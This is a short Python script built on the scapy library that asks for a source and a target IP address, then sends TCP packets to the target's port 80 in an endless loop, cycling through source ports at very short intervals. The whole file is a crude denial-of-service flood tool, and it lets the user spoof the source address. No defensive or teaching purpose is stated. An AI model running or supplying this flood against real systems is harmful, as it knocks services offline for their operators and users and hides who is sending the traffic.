from scapy.all import *

src = input("Source IP: ")
target = input("Target IP: ")

i=1
while True:
    for srcport in range(1, 65535):
        ip = IP(src=src, dst=target)
        tcp = TCP(sport=srcport, dport=80)
        pkt = ip / tcp
        send(pkt, inter= .0001)
        print("Packet Sent ", i)
        i=i+1